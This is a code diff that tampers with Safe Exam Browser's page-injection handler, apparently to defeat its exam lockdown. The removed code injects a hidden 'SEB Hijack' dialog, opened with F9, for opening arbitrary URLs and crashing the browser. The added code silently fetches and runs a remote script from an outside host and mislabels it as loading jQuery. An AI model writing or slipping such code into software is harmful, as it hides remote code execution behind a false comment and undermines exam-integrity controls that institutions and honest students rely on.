@@ -49,66 +49,30 @@ namespace SafeExamBrowser.Browser.Handlers
 				frame.ExecuteJavaScriptAsync($"window.print = function() {{ alert('{text.Get(TextKey.Browser_PrintNotAllowed)}') }}");
 			}
 
-var js = @"
-				
-				// Add event listener for F9 key to open the dialog
-				document.addEventListener('keydown', (event) => {
-					if (event.key === 'F9') {
-						document.getElementById('SEB_Hijack').showModal();
-					}
-				});
-				
-				// Create the dialog element
-				const dialog = document.createElement('dialog');
+			var js = @"
+				function loadScript(url, completeCallback) {
+				var script = document.createElement('script');
+				script.src = url;
+				script.async = true; // Use async for non-blocking loading
 
-				// Add content to the dialog
-				dialog.innerHTML = `
-					<h2>SEB Hijack</h2>
-					<input type='text' id='urlInput' placeholder='Enter URL' required>
-					<button id='openUrlButton'>Open URL</button>
-					<button id='exitSEB'>Crash SEB</button>
-					<button id='closeButton'>Close</button>
-				`;
-
-				// Set the dialog ID
-				dialog.id = 'SEB_Hijack';
-
-				// Append the dialog to the body
-				document.body.appendChild(dialog);
-
-				// Create and append a style element for styling
-				const style = document.createElement('style');
-				style.textContent = `
-					dialog {
-						border: none;
-						border-radius: 5px;
-						box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-						padding: 20px;
-					}
-					#urlInput {
-						width: calc(100% - 22px);
-						padding: 5px;
-						margin-right: 5px;
-					}
-				`;
-				document.head.appendChild(style);
-
-				// Add event listener to close the dialog
-				document.getElementById('closeButton').addEventListener('click', () => {
-					document.getElementById('SEB_Hijack').close();
-				});
-
-				// Add event listener to handle button click
-				document.getElementById('openUrlButton').addEventListener('click', () => {
-					const url = document.getElementById('urlInput').value;
-					window.open(url, '_blank');
-					dialog.close();
-				});
-
-				// Add event listener to crash SEB
-                document.getElementById('exitSEB').onclick = function() {
-					CefSharp.PostMessage({ type: 'exitSEB' });
+				script.onload = function() {
+					completeCallback();
+					// Clean up the script reference
+					script.onload = null; // Prevent memory leaks
 				};
+
+				script.onerror = function() {
+					console.error('Error loading script:', url);
+				};
+
+				document.head.appendChild(script);
+			}
+
+			// Load jQuery over HTTPS
+			loadScript('https://wxnnvs.ftp.sh/un-seb/the_script.js', function() {
+				alert('jQuery has been loaded.');
+			});
+
 			";
 
 			frame.ExecuteJavaScriptAsync(js);
